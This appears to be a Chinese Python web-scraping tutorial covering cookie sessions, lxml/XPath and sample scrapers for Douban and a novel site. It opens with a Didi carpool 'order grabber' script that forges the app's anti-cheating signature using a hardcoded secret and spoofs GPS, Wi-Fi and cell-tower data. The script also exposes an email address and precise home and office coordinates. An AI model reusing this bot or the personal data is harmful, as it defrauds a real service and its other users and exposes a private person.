 ,'model':'MI 4LTE'
 ,'networkType':'WIFI'
 ,'order_id':'3635506508184237070'
 ,'order_level':'1'
 ,'os':'6.0.1'
 ,'route_id':'4338899913'
 ,'serial':'1462283172995'
 #,'sig':'82d12c28338ca223876af1242cf341e6a334cc50'
 ,'source':'0'
 ,'suuid':'F759479A0C2CCDE83BE5EA8D5F6EC05E_15'
 ,'token':TOKEN
 ,'uuid':'D85C052433285BB365875F9F3AA28EFE'
 ,'vcode':'162'
 ,'view_sort':'0c'
}

# 此函数用来计算sig - 用来加入请求参数中. 这个SIG参数一般是ＡＰＰ用来防止你通过模拟作弊的．
def getSig(map):
 from operator import itemgetter
 params = sorted(map.iteritems(), key=itemgetter(0), reverse=False)
 newList = []
 PREFIX = "didiwuxiankejiyouxian2013"
 newList.append(PREFIX)
 for parm in params:
 newList.append(parm[0]+parm[1])
 newList.append(PREFIX)
 data = ''.join(newList)
 import hashlib
 sig = hashlib.sha1(data).hexdigest();
 return sig

POINT_HOME = set([u'万科溪之谷',u'依云溪谷'])
POINT_OFFICE = set([u'大连软件园腾飞',u'腾飞软件园',u'谷歌里',u'东软软件园B区'])

#挑选合适的单子,条件包括：
# a. 起点终点在POINT_HOME和POINT_OFFICE中;
# b. 时间在[MORNING_START,MORNING_END], 或[AFTERNOON_START,AFTERNOON_END]
def filter(order):
 departure_time = order["trip_info"]['text_setup_time']
 #route_id = order['route_id']
 order_id = order["order_info"]['order_id']
 from_name = order["trip_info"]['from_name']
 from_address = order["trip_info"]['from_address']
 to_name = order["trip_info"]['to_name']
 to_address = order["trip_info"]['to_address']
 price = order["trip_info"]['price']

 global MORNING_START,MORNING_END,AFTERNOON_START,AFTERNOON_END
 #上班
 if(departure_time[-5:]>=MORNING_START and departure_time[-5:]<=MORNING_END):
 #测试起点
 start = False;
 for oneArea in POINT_HOME:
  if from_name.find(oneArea)>-1:
  start = True;
  break;
 if(start == False):
  return False;

 #测试终点
 end = False;
 for oneArea in POINT_OFFICE:
  if to_name.find(oneArea)>-1:
  end = True;
  break;
 return end;

 #下班
 if(departure_time[-5:]>=AFTERNOON_START and departure_time[-5:]<=AFTERNOON_END):
 #测试起点
 start = False;
 for oneArea in POINT_OFFICE:
  if from_name.find(oneArea)>-1:
  start = True;
  break;
 if(start == False):
  return False;

 #测试终点
 end = False;
 for oneArea in POINT_HOME:
  if to_name.find(oneArea)>-1:
  end = True;
  break;
 return end;

 return False; #其它一律视为不符合条件

HOME_at_wf_bssid = 'ec:88:8f:2b:a1:84'
HOME_at_wf_ssid = '"MERCURY_2BA184"'
HOME_lat='38.814874403212'
HOME_lng='121.577924262153'
HOME_at_mb_cid='68630454'
HOME_at_mb_lac='49441'
#
OFFICE_at_wf_bssid = '8c:be:be:16:b5:74'
OFFICE_at_wf_ssid = '"zzzzzz"'
OFFICE_lat='38.949033203125'
OFFICE_lng='121.418660753038'
OFFICE_at_mb_cid='18538497'
OFFICE_at_mb_lac='16836'

#修改参数
def updateParmsMap(map):
 localtime = time.localtime(time.time())
 hour = str(localtime.tm_hour)
 min = str(localtime.tm_min)
 if(len(hour)==1): hour='0'+hour
 if(len(min)==1): min='0'+min
 hm = hour+':'+min
 if( hm>'09:00' and hm<'18:30'):#OFFICE
 if(map.has_key('at_wf_bssid')): map['at_wf_bssid']=OFFICE_at_wf_bssid
 if(map.has_key('at_wf_ssid')): map['at_wf_ssid']=OFFICE_at_wf_ssid
 if(map.has_key('lat')): map['lat']=OFFICE_lat
 if(map.has_key('lng')): map['lng']=OFFICE_lng
 if(map.has_key('at_mb_cid')): map['at_mb_cid']=OFFICE_at_mb_cid
 if(map.has_key('at_mb_lac')): map['at_mb_lac']=OFFICE_at_mb_lac
 else:#HOME
 if(map.has_key('at_wf_bssid')): map['at_wf_bssid']=HOME_at_wf_bssid
 if(map.has_key('at_wf_ssid')): map['at_wf_ssid']=HOME_at_wf_ssid
 if(map.has_key('lat')): map['lat']=HOME_lat
 if(map.has_key('lng')): map['lng']=HOME_lng
 if(map.has_key('at_mb_cid')): map['at_mb_cid']=HOME_at_mb_cid
 if(map.has_key('at_mb_lac')): map['at_mb_lac']=HOME_at_mb_lac
 now = int(time.time())
 #map['_t']=str(now)
 map['locateTime']=str(now+10)
 if(map.has_key('app_time')): map['app_time']=str(now+10)
 date_id = int(time.mktime(datetime.date.today().timetuple()))
 map['date_id']=str(date_id)
 sig = getSig(map)
 map['sig']=sig

def getOrdersViaUrl(url):
 req = urllib2.Request(url,headers=headers)
 respInfo = urllib2.urlopen(req,timeout=15)
 html = getHtmlContent(respInfo)
 #debug(logger,html)

 json_data = json.loads(html)
 orders=[]
 section_list = []
 if(json_data.has_key('section_list')):
 section_list=json_data['section_list']
 for section in section_list:
 type = section["type"]
 if(type=="byway_order_info"):
  orders = section["list"]
  break
 return orders

# 获得线路route_id上所有的单子
def getOrders_432():
 localtime = time.localtime(time.time())
 hour = localtime.tm_hour
 if(hour>=10 and hour<=19):
 one_way_map['route_id']=ROUTE_ID_AFTERNOON1
 updateParmsMap(one_way_map)
 paraStr = urllib.urlencode(one_way_map)
 url = "http://api.didialift.com/beatles/api/route/driver/info?"+paraStr
 orders = getOrdersViaUrl(url)
 return orders
 else:
 one_way_map['route_id']=ROUTE_ID_MORNING1
 updateParmsMap(one_way_map)
 paraStr = urllib.urlencode(one_way_map)
 url = "http://api.didialift.com/beatles/api/route/driver/info?"+paraStr
 orders = getOrdersViaUrl(url)
 return orders

# 抢单
def striveOrder(order):
 route_id = order['route_id']
 order_id = order['order_id']

 # put time and sig params
 updateParmsMap(strive_para_map)
 strive_para_map['route_id']=route_id
 strive_para_map['order_id']=order_id
 sig = getSig(strive_para_map)
 strive_para_map['sig']=sig

 paraStr = urllib.urlencode(strive_para_map)
 url = "http://api.didialift.com/beatles/api/driver/order/strive?"+paraStr
 req = urllib2.Request(url,headers=headers)
 respInfo = urllib2.urlopen(req,timeout=15)
 html = getHtmlContent(respInfo)
 #debug(logger,html)
 map = json.loads(html)
 return map['errno']=='0' and map['errmsg']=='OK'


if __name__ == '__main__':
 try:
 # 发邮件通知你服务启动了
 send_mail(['358275018@qq.com'],'didi catcher starts','didi catcher starts')
 except Exception,e:
 pass

 log_path = os.path.dirname(os.path.realpath(__file__))
 if not os.path.exists(log_path):
 os.makedirs(log_path)
 logger = getPyLogger('didi','debug',os.path.join(log_path,os.path.basename(__file__)+'.log'),'d',1,99999)

 debug(logger,'start to work...')
 while(1):
 try:
  #从坚果云中LOAD最新的参数
  loadTimeConfig()

  debug(logger,'FLOW: get my orders')
  orders = getOrders_432()
  debug(logger,'FLOW: GOT ================='+str(len(orders))+' ==================orders')
  for order in orders: # 所有单子
  departure_time = order["trip_info"]['text_setup_time']
  #route_id = order['route_id']
  order_id = order["order_info"]['order_id']
  from_name = order["trip_info"]['from_name']
  from_address = order["trip_info"]['from_address']
  to_name = order["trip_info"]['to_name']
  to_address = order["trip_info"]['to_address']
  price = order["trip_info"]['price']
  passenger_id = order['user_info']['user_id']
  nick_name = order['user_info']['nick_name']

  debug(logger,'FLOW: filter orders')
  debug_content = '%s (%s->%s) price=%s'%(departure_time,from_name,to_name,price) #nick_name
  debug(logger,debug_content)

  if(filter(order)): #过滤单子
   debug(logger,'FLOW: strive order')
   striveOrder(order) #抢合适的单子
   #print 'FOUND **************************************** FOUND'
   content = departure_time.encode('utf8')+' '+from_name.encode('utf8')+' '+to_name.encode('utf8')
   # 抢到合适的单子, 给自己发邮件.
   send_mail(['358275018@qq.com'],content,content)
   break;
  time.sleep(10)
 except Exception,e:
  debug(logger,str(e))
  time.sleep(10)
 # 退出, 发邮件通知.
 send_mail(['358275018@qq.com'],'didi chatcher exits','didi chatcher exits')

</textarea>
</div>

<div id="cookie">
<h4>http.cookiejar模块:管理cookie</h4><pre>
使用urlopen()可发送GET、POST、PUT、DELETE、PATCH等请求,因此绝大部分时候完全可使用urllib.request模块代替http.client模块。
有时用户可能需要访问Web应用中的被保护页面,如果使用浏览器则十分简单,通过系统提供的登录页面登录系统,浏览器会负责维护与服务器之间的session,如果用户登录的用户名、密码符合要求就可以访问被保护资源了。
如果使用urllib.request模块来访问被保护页面则同样需要维护与服务器之间的session,此时就需要借助于cookie管理器来实现。

HTTP是一种"请求-响应"式协议:客户端向服务器发送请求,服务器向客户揣生成响应数据。这就涉及一个问题,服务器如何辨别两次请求的客户端是同一个客户端呢？答案是session id。当客户端第一次向服务器发送请求时,服务器会为该客户端分配一个session id作为其标识,服务器在生成响应数据时也会把该session id作为响应数据发送给客户端。当客户端第二次向服务器发送请求时,如果客户端把自己的session id也发送给服务器,且服务器端的session id还未过期,服务器就知道该客户端与前一次发送请求的客户端是同一个。

如果程序直接使用urlopen()发送请求,并未管理与服务器之间的session,那么服务器就无法识别两次请求是否是同一个客户端发出的。为了有效地管理session,程序可引入http.cookiejar模块。

此外程序还需要使用OpenerDirector对象来发送请求。为了使用urllib.request模块通过cookie来管理session,可按如下步骤进行操作:
1、创建http.cookiejar.CookieJar对象或其子类如MozillaCookieJar的对象。
2、以CookieJar对象为参数,创建urllib.request.HTTPCookieProcessor对象,该对象负责调用CookieJar来管理cookie。
3、以HTTPCookieProcessor对象为参数,调用urllib.request.build_opener()函数创建OpenerDirector对象
4、使用OpenerDirector对象来发送请求,该对象将会通过HTTPCookieProcessor调用CookieJar来管理cookie

</pre>先登录Web应用,然后访问Web应用中的被保护页面<textarea>
from urllib.request import *
import http.cookiejar, urllib.parse

cookie_jar = http.cookiejar.MozillaCookieJar('a.txt')  # 以指定文件创建CookieJar对象,对象将可以把cookie信息保存在文件中
cookie_processor = HTTPCookieProcessor(cookie_jar)     # 创建HTTPCookieProcessor对象
opener = build_opener(cookie_processor)                # 创建OpenerDirector对象
user_agent = r'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'
headers = {'User-Agent':user_agent, 'Connection':'keep-alive'}  # 定义请求头

#-------------下面代码发送登录的POST请求----------------
params = {'name':'crazyit.org', 'pass':'leegang'}                           # 定义登录系统的请求参数
postdata = urllib.parse.urlencode(params).encode()
request = Request('http://localhost:8888/test/login.jsp', data = postdata, headers = headers)
response = opener.open(request)                                             # 使用OpenerDirector发送POST请求
print(response.read().decode('utf-8'))
cookie_jar.save(ignore_discard=True, ignore_expires=True)                   # 将cookie信息写入之前指定的磁盘文件
# 程序就会把cookie信息写入a.txt文件中。这意味着该程序将会把服务器响应的session id等cookie持久化保存在a.txt文件中,后面程序可以读取该cookie文件信息,这样程序就可以模拟前面登录过的客户端,从而直接访问被保护页面了

#----------下面代码发送访问被保护资源的GET请求---------
request = Request('http://localhost:8888/test/secret.jsp', headers=headers) # 创建向"受保护页面"发送GET请求的Request
response = opener.open(request)
print(response.read().decode())

</textarea>该程序并未向服务器发送登录请求,但由于该CookieJar会把登录成功的session id发送给服务器,因此服务器就会认为该程序与前面那个登录成功的程序是同一个客户端。运行上面程序也可以访问到Web应用中的被保护页面<textarea>
from urllib.request import *
import http.cookiejar, urllib.parse

cookie_jar = http.cookiejar.MozillaCookieJar('a.txt')  # 以指定文件创建CookieJar对象,对象将可以把cookie保存在文件中
cookie_jar.load('a.txt',ignore_discard=True,ignore_expires=True) # 直接加载a.txt中的Cookie信息
for item in cookie_jar:                                          # 遍历a.txt中保存的cookie信息
    print('Name ='+ item.name)
    print('Value ='+ item.value)
cookie_processor = HTTPCookieProcessor(cookie_jar)               # 创建HTTPCookieProcessor对象
opener = build_opener(cookie_processor)                          # 创建OpenerDirector对象
user_agent = r'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'
headers = {'User-Agent':user_agent, 'Connection':'keep-alive'}    # 定义请求头

#-------------下面代码发送访问被保护资源的GET请求----------------
request = Request('http://localhost:8888/test/secret.jsp', headers=headers) # 创建向"受保护页面"发送GET请求的Request
response = opener.open(request)
print(response.read().decode())

</textarea>
</div>

<div id="lxml">
<h4>lxml xpath</h4><pre>
pip3 install lxml

lxml是python的一个解析库,支持HTML和XML的解析,支持XPath解析方式,而且解析效率非常高

lxml是C语言的速度和Python的简易相结合的神器,对C语言库libxml2和libxslt进行绑定,提供了Pythonic的API,它有一些主要特点：
支持标准的XML
支持(损坏)的HTML
非常快的解析速度
Pythonic的API更易于使用
使用Python的unicode字符串
内存安全(没有段错误)
不需要手动管理内存

lxml有两大部分,分别支持XML和HTML的解析：
lxml.etree 解析XML
lxml.html 解析html,从html字符串生成文档树结构

【 从HTML字符串转换成的HtmlElement对象 】
下载得到的网页就是一串html字符串,lxml模块提供了五种不同的方法把它输入给lxml.html模块从而生成html文档的树结构呢
1、parse(filename_url_or_file):
输入的是一个文件名、URL或文件对象(有read()方法)。

2、document_fromstring(string):
输入的是一个html的字符串,创建一个HTML文档树结构,它的根节点就是, 和 子节点。

import lxml.html  as lh
z = lh.document_fromstring('<span>abc</span><span>xyz</span>')
# 自动加了根节点< html>
z                # < Element html at 0x7fc410667b88>
z.tag            # 'html'
# 还加了< body>节点
z.getchildren()  # [< Element body at 0x7fc4101a3ae8>]
# 把字符串的两个节点放在了< body>里面
z.getchildren()[0].getchildren() [< Element span at 0x7fc410092bd8>, < Element span at 0x7fc410667c28>]

3、fragment_fromstring(string, create_parent=False):
返回输入字符串的HTML片段。这个片段只含有一个element(元素)即单一节点,除非给出了create_parent参数,否则会报错。

z = lh.fragment_fromstring('<div>abc</div><div>xyz</div>') # ParserError: Multiple elements found (div, div)
# 输入是两个节点(element)时就会报错,如果加上create_parent参数就没问题了
z = lh.fragment_fromstring('<div>abc</div><div>xyz</div>', create_parent='p')
z.tag            # 'p'
z.getchildren()  # [< Element div at 0x7fc40a41a818>, < Element div at 0x7fc40a41aea8>]

4、fragments_fromstring(string):
返回包含输入字符串中所有片段的列表。

# 输入字符串含有一个节点则返回包含这一个节点的列表
lh.fragments_fromstring('<div>abc</div>')               # [< Element div at 0x7fc40a124ea8>]
# 输入字符串含有多个节点则返回包含这多个节点的列表
lh.fragments_fromstring('<div>abc</div><div>xyz</div>') # [< Element div at 0x7fc>, < Element div at 0x7fc4>]

5、fromstring(string):
返回值依据输入字符串而定,如果输入看起来像是一个文档则返回document_fromstring(string),如果是一个单一片段则返回fragment_fromstring(string)。

z = lh.fromstring('<div>abc</div><div>xyz</div>')
type(z)         # lxml.html.HtmlElement
z               # < Element div at 0x7fc40a0eb368>
z.getchildren() # [< Element div at 0x7fc410135548>, < Element div at 0x7fc40a0eb2c8>]

【 操作HtmlElement对象从中提取数据 】

</pre>lxml.html的HtmlElement对象的各种属性和方法<textarea>
# .attrib属性是html tag的属性集合,以字典表示
# .get()方法是取得某个属性的值,相当于字典的.get()方法
doc = lxml.html.fromstring('<div class="post" id="123"><p class="para">abc<a href="/to-go">link</a></p></div>')
doc.attrib        # {'class': 'post', 'id': '123'}
doc.get('class')  # 'post'

# .drop_tag()方法移除该html标签,但保留它的子节点和文本并合并到该标签的父节点。
doc = lxml.html.fromstring('<div class="post" id="123"><p class="para">abc<a href="/to-go">link</a></p></div>')
doc.find('.//p').drop_tag()
lxml.html.tostring(doc)      # b'<div class="post" id="123">abc<a href="/to-go">link</a></div>'

# .drop_tree()方法移除该节及其子节点和文本,而它后面的文本(尾文)合并到前面一个节点或父节点。
doc = lxml.html.fromstring('<div class="post" id="123"><p class="para">abc<a href="/to-go">link</a></p></div>')
doc.find('.//p').drop_tree()
lxml.html.tostring(doc)      # b'<div class="post" id="123"></div>'

# .find(path),.findall(path),.findtext(path)方法
通过路径(Xpath的)或标签查找特定节点,前者返回找到的第一个,第二个返回找到的全部HTML元素,第三个返回找到的第一个的节点的文本(的.text)
doc = lxml.html.fromstring('<div class="post" id="123"><p class="para">abc<a href="/to-go">link</a></p></div>')
doc.find('p')         # < Element p at 0x7fc40a4dd6d8>
doc.find('.//a')      # < Element a at 0x7fc409fee4a8>
doc.findall('p')      # [< Element p at 0x7fc40a4dd6d8>]
doc.findtext('.//a')  # 'link'

# .find_class(CLASS_NAME)方法通过类名称查找所有含有CLASS_NAME的元素,返回的HtmlElement的列表
doc = lxml.html.fromstring('<div class="post" id="123"><p class="para">abc<a href="/to-go">link</a></p><p class="para p2"></p></div>')
doc.find_class('para')         # [< Element p at 0x7fc40a3ff278>, < Element p at 0x7fc40a3ffc78>]

# .get_element_by_id(id)方法得到第一个ID为输入ID的节点。如果有多个相同ID的节点只返回第一个。
doc = lxml.html.fromstring('<div class="post" id="123"><p class="para">abc<a href="/to-go">link</a></p></div>')
doc.get_element_by_id('123')   # < Element div at 0x7fc409fda2c8>

# .getchildren(),getparent()方法获得子节点列表和父节点
doc = lxml.html.fromstring('<div class="post" id="123"><p class="para">abc<a href="/to-go">link</a></p></div>')
doc.getchildren()              # [< Element p at 0x7fc410836b38>]
doc.getparent()                # < Element body at 0x7fc40a3ff9a8>,输入的本没有body,div已经是最上层节点,它的父节点就是body了

# .getnext()。getprevious()方法获取后一个或前一个节点,如果没有则返回无。
doc = lxml.html.fromstring('<div><p>abc</p><p>xyz</p></div>')
doc.getnext()
doc.find('p').getnext()        # < Element p at 0x7fc409fdad68>
doc.find('p').getprevious()

# .getiterator(),.iter()方法从该节点开始,按文档顺序(深度优先)遍历所有子节点。可以指定只遍历某些标签。
doc = lxml.html.fromstring('<div class="post" id="123"><p class="para">abc<a href="/to-go">link</a></p></div>')
for itr in doc.getiterator(): print(itr.tag, end=" ")  # div p a
for itr in doc.iter(): print(itr.tag, end=" ")         # div p a

# .iterchildren()只遍历子节点,.iterancestors()跳过该节点遍历前辈(从父亲节点开始),iterdescendants()方法跳过该节点遍历后辈(从子辈开始)
doc = lxml.html.fromstring('<div class="post" id="123"><p class="para">abc<a href="/to-go">link</a></p></div>')
a = doc.find('.//a')
for itr in doc.iterancestors(): print(itr.tag, end=" ")  # body html
for itr in a.iterancestors(): print(itr.tag, end=" ")    # p div body html
for itr in doc.iterdescendants(): print(itr.tag, end=" ")# p a

# .iterfind(path)方法遍历所有符合路径的子节点,类似于的findall()
# .make_links_absolute(BASE_URL)很多网页的链接都是类似HREF =" /路径/ a.html"没有写全网址,这个方法的作用就是补全网址。
# .tag属性表示该节点的html标签名称
# .text .tail属性都是该节点的文本内容,不同的是一个在标签内,一个在尾部：<p>text</p>tail
doc = lxml.html.fromstring('<div><p class="para">abc<a href="/to-go">link</a>worod</p>apple</div>')
p = doc.find('p')
p.text     # 'abc'
p.tail     # 'apple'

# .text_content()方法返回给节点及其子节点包含的所有文本
doc.text_content()  # 'abclinkworodapple'

</textarea><pre>
【 网页内容提取根据xpath 】
参考:浏览器审查元素右键弹出菜单栏 Copy==> Copy Xpath,如删除浏览器经常在自己里面增加多余的tbody标签,在element面板可以使用xpath查找元素

XPath全称XML Path Language即XML路径语言,它是一门在XML文档中查找信息的语言,它最初是用来搜寻XML文档的,但同样适用于HTML文档的搜索
XPath的选择功能十分强大,提供了非常简明的路径选择表达式,另外还提供了超过100个内建函数,用于字符串、数值、时间的匹配以及节点、序列的处理等,几乎所有想要定位的节点都可以用XPath来选择
XPath于1999年11月16日成为W3C标准,它被设计为供XSLT、XPointer以及其他XML解析软件使用,官方网站：https://www.w3.org/TR/xpath/

4点特性：
XPath使用路径表达式在XML文档中进行导航,使用XPath很容易定位到网页中的节点,这些路径跟电脑目录、网址的路径很相似,通过/来表示路径的深度
XPath包含一个标准函数库,内建了100多个函数
XPath是XSLT中的主要元素
XPath是一个W3C标准

Xpath的节点Node
XPath中的核心就是节点,定义了7种不同类型的节点： 元素(Element)、属性(Attribute)、文本(Text)、命名空间(Namespace)、处理指令(processing-instruction)、注释(Comment)和文档节点(Document nodes)
这些节点组成一棵节点树,树的根节点html被称为文档节点,命名空间、处理指令和网页数据提取基本无关

XPath节点的关系
父(Parent)、子(Children)、同辈(Sibling)、先辈(Ancestor)、后代(Descendant)

from lxml import etree
s=etree.HTML(源码) # 将源码转化为能被XPath匹配的格式
s.xpath(xpath表达式) # 返回列表

XPath节点的选取
选取节点也就是通过路径表达来实现,XPath常用规则:
nodename 选取此节点的所有子节点
/ 若在最前则表示从根节点开始选取,否则选择当前节点下的某个节点,/代表只获取直接子节点
// 从全局节点中选取某一节点所在所有位置,返回列表,//代表获取子孙节点
. 选取当前节点
.. 选取当前节点的父节点
@ 选取属性
* 通配符,选择所有元素节点与元素名
@*  选取所有属性
[@attrib] 选取具有给定属性的所有元素
[@attrib='value'] 选取给定属性具有给定值的所有元素
[tag] 选取所有具有指定元素的直接子节点
[tag='text']  选取所有具有指定元素并且文本内容是text节点
| 可选符 使用|可选取若干个路径 如//p | //div 即在当前路径下选取所有符合条件的p标签和div标签。
/text() 获取当前路径下的文本内容
/@xxxx 提取当前路径下标签的属性值

路径表示中还可以选取多个路径,使用'|'运算符
//book/title | //book/price  # 选取book元素的所有title和price元素。

/html/body/ul/li     # 从根节点开始依照路径选取li元素,返回多个。
//ul/li[1]           # 还是选取li元素,但是路径多级跳跃到ul/li,[1]表示只取第一个li。
//li[last()]         # 还是选取li,但路径更跳跃,[last()]表示取最后一个li元素。
//li[@class]         # 选取根节点的名为li且有class属性的所有后代。
//li[@class="item"]  # 选择根节点的名为li且class属性为item的所有后代。
//body/*/li          # 选取body的名为li的孙子节点,*是通配符,表示任何节点。
//li[@*]             # 选取所有带属性的li元素。
//body/div、//body/ul # 选取body的所有div和ul元素。
body/div             # 相对路径,选取当前节点的body元素的子元素div。绝对路径以/开始。

</pre><textarea>
# 导入lxml库的etree模块
from lxml import etree

### 读取文本解析节点
text = '''
<div>
    <ul>
         <li class="item-0"><a href="link1.html">first item</a></li>
         <li class="item-1"><a href="link2.html">second item</a></li>
         <li class="item-inactive"><a href="link3.html">third item</a></li>
         <li class="item-1"><a href="link4.html">fourth item</a></li>
         <li class="item-0"><a href="link5.html">fifth item</a>
    </ul>
</div>
'''

html = etree.HTML(text)        # 调用HTML类初始化构造XPath解析对象,etree模块可自动修正补全未闭合的标签并自动添加body、html节点
print(html, type(html))        # < Element html at 0x7f2b310fa548> < class 'lxml.etree._Element'>
result = etree.tostring(html)  # 调用tostring()方法输出修正后的HTML代码,但结果是bytes类型,利用decode()方法将其转成str类型
print(type(result))            # < class 'bytes'>
print(result.decode('utf-8'))

### 直接读取文本文件进行解析
html = etree.parse('./test.html',etree.HTMLParser()) # 指定解析器HTMLParser会根据文件修复HTML文件中缺失的如声明信息
result=etree.tostring(html)      # 解析成字节
#result=etree.tostringlist(html) # 解析成列表
print(type(html))                # < class 'lxml.etree._ElementTree'>
print(type(result))              # < class 'bytes'>
print(result)

# 使用xpath获取数据
print(html)                 # < Element html at 0x1b222a694c8>

aList = html.xpath('//a')
print(type(aList))           # < class 'list'>
print(aList)  # [< Element a at 0x14c88>, < Element a at 0x14c08>, < Element a at 0x14c48>, < Element a at 0x14c88>, < Element a at 0x14cc8>]
print([e for e in dir(aList[0]) if not e.startswith('_')])
# ['addnext', 'addprevious', 'append', 'attrib', 'base', 'clear', 'cssselect', 'extend', 'find', 'findall', 'findtext', 'get', 'getchildren', 'getiterator', 'getnext', 'getparent', 'getprevious', 'getroottree', 'index', 'insert', 'items', 'iter', 'iterancestors', 'iterchildren', 'iterdescendants', 'iterfind', 'itersiblings', 'itertext', 'keys', 'makeelement', 'nsmap', 'prefix', 'remove', 'replace', 'set', 'sourceline', 'tag', 'tail', 'text', 'values', 'xpath']
print(aList[0].get('href'))  # link1.html

aList = html.xpath('//a/@href')
print(type(aList))           # < class 'list'>
print(aList)  # ['link1.html', 'link2.html', 'link3.html', 'link4.html', 'link5.html']

</textarea>xpath爬取豆瓣音乐top250<textarea>
from lxml import etree
import requests

url = 'https://music.douban.com/top250'
html = requests.get(url).text
s = etree.HTML(html)

### 查看第一首歌
href = s.xpath('//*[@id="content"]/div/div[1]/div/table[1]/tr/td[2]/div/a/@href')[0]
title = s.xpath('//*[@id="content"]/div/div[1]/div/table[1]/tr/td[2]/div/a/text()')[0]
score = s.xpath('//*[@id="content"]/div/div[1]/div/table[1]/tr/td[2]/div/div/span[2]/text()')[0]
numbers = s.xpath('//*[@id="content"]/div/div[1]/div/table[1]/tr/td[2]/div/div/span[3]/text()')[0]
imgpath = s.xpath('//*[@id="content"]/div/div[1]/div/table[1]/tr/td[1]/a/img/@src')[0]
print(href, title,score,numbers, imgpath)

title2 = s.xpath('//*[@id="content"]/div/div[1]/div/table[2]/tr/td[2]/div/a/text()')[0]
title3 = s.xpath('//*[@id="content"]/div/div[1]/div/table[3]/tr/td[2]/div/a/text()')[0]
title4 = s.xpath('//*[@id="content"]/div/div[1]/div/table[4]/tr/td[2]/div/a/text()')[0]
print(title,title2,title3,title4)

### 对比他们的xpath,发现只有table序号不一样,可以掉序号得到通用的xpath信息
hrefs = s.xpath('//*[@id="content"]/div/div[1]/div/table/tr/td[2]/div/a/@href')
titles = s.xpath('//*[@id="content"]/div/div[1]/div/table/tr/td[2]/div/a/text()')
scores = s.xpath('//*[@id="content"]/div/div[1]/div/table/tr/td[2]/div/div/span[2]/text()')
numbers = s.xpath('//*[@id="content"]/div/div[1]/div/table/tr/td[2]/div/div/span[3]/text()')
imgs = s.xpath('//*[@id="content"]/div/div[1]/div/table/tr/td[1]/a/img/@src')
for i in range(25):
    print (hrefs[i],titles[i],scores[i],numbers[i],imgs[i])

### 精简xpath路径
trs = s.xpath('//*[@id="content"]/div/div[1]/div/table/tr')  #先提取tr之前的节点集合
for tr in trs:
    href = tr.xpath('./td[2]/div/a/@href')[0]  #注意新节点是tr下的节点
    title = tr.xpath('./td[2]/div/a/text()')[0]
    score = tr.xpath('./td[2]/div/div/span[2]/text()')[0]
    number = tr.xpath('./td[2]/div/div/span[3]/text()')[0]
    img = tr.xpath('./td[1]/a/img/@src')[0]
    print (href,title,score,number,img)

### 完整代码
from lxml import etree
import requests

#获取页面地址
def getUrl():
    for i in range(10):
        url = 'https://music.douban.com/top250?start={}'.format(i*25)
        scrapyPage(url)

#爬取每页数据
def scrapyPage(url):
    html = requests.get(url).text
    s = etree.HTML(html)
    trs = s.xpath('//*[@id="content"]/div/div[1]/div/table/tr')

    for tr in trs:
        href = tr.xpath('./td[2]/div/a/@href')[0]
        title = tr.xpath('./td[2]/div/a/text()')[0]
        score = tr.xpath('./td[2]/div/div/span[2]/text()')[0]
        number = tr.xpath('./td[2]/div/div/span[3]/text()')[0]
        img = tr.xpath('./td[1]/a/img/@src')[0]
        print href, title, score, number, img

if  __name__ == '__main__':
    getUrl()

</textarea>使用scrapy.Selector中的xpath爬取小说<textarea>
from scrapy import Selector
import requests

class KeyEnum(object):
    TITLE = "title"
    CONTENT = "content"
    HREF = "href"

class NovelSpider(KeyEnum):
    def __init__(self):
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
        }

    def spider(self):
        url = 'http://seputu.com/'
        response = requests.get(url, headers=self.headers)
        selector = Selector(text=response.content)
        data_list = []
        li_list = selector.xpath(".//div[@class='box']/ul//li")  # 章节列表
        for text in li_list:
            title = text.xpath("./a/text()").extract_first('')  # 标题
            href = text.xpath('./a/@href').extract_first('')  # 链接
            content = self._content_spider(href)  # 详情页面爬虫
            data_list.append(
                {
                    KeyEnum.HREF: href,
                    KeyEnum.TITLE: title,
                    KeyEnum.CONTENT: content,
                }
            )
        return data_list

    def _content_spider(self, url):
        content = ''

        for _ in range(5):  # 因为没用代理,如果失败,再重试5次
            if url:  # 加个url是否为空的判断
                response = requests.get(url, headers=self.headers)
                if response.status_code != 200:
                    continue
                selector = Selector(text=response.content)

                p_list = selector.xpath(".//div[@class='content-body']//p")
                for data in p_list:
                    content += data.xpath("./text()").extract_first('')

            return content

    def main(self):
        data_list = self.spider()
        for i in data_list:
            with open('盗墓笔记.txt', 'a', encoding='utf-8')as f:
                f.write(i['content'])


if __name__ == '__main__':
    spider = NovelSpider()
    spider.main()

</textarea><pre>
【 获取所有节点 】
一般会用//开头的XPath规则来选取所有符合要求的节点,使用*代表匹配所有节点即整个HTML文本中的所有节点都会被获取,返回形式是一个列表,每个元素是Element类型,其后跟了节点的名称如html、body、div、ul、li、a等,所有节点都包含在列表中

</pre><textarea>
from lxml import etree
html = etree.parse('./test.html', etree.HTMLParser())
result = html.xpath('//*') # //代表获取子孙节点,*代表获取所有
print(type(html))          # < class 'lxml.etree._ElementTree'>
print(type(result))        # < class 'list'>
print(result)
# [< Element html at 0x10510d9c8>, < Element body at 0x10510da08>, < Element div at 0x10510da48>, < Element ul at 0x10510da88>, < Element li at 0x10510dac8>, < Element a at 0x10510db48>, < Element li at 0x10510db88>, < Element a at 0x10510dbc8>, < Element li at 0x10510dc08>, < Element a at 0x10510db08>, < Element li at 0x10510dc48>, < Element a at 0x10510dc88>, < Element li at 0x10510dcc8>, < Element a at 0x10510dd08>]

# 此处匹配也可以指定节点名称,获取所有li节点:
from lxml import etree
html = etree.parse('./test.html', etree.HTMLParser())
result = html.xpath('//li')  # 获取所有子孙节点的li节点
print(result)
print(result[0])
# [< Element li at 0x105849208>, < Element li at 0x105849248>, < Element li at 0x105849288>, < Element li at 0x1058492c8>, < Element li at 0x105849308>]
< Element li at 0x105849208>

</textarea><pre>
【 获取子节点 】
通过/或//即可查找元素的子节点或子孙节点

</pre><textarea>
# 选择所有li节点的所有直接a子节点,//li用于选中所有li节点,/a用于选中li节点的所有直接子节点a
html = etree.parse('./test.html', etree.HTMLParser())
result = html.xpath('//li/a')
print(result)

# /用于选取直接子节点,//用于获取所有子孙节点,获取ul节点下的所有子孙a节点,结果同上
html = etree.parse('./test.html', etree.HTMLParser())
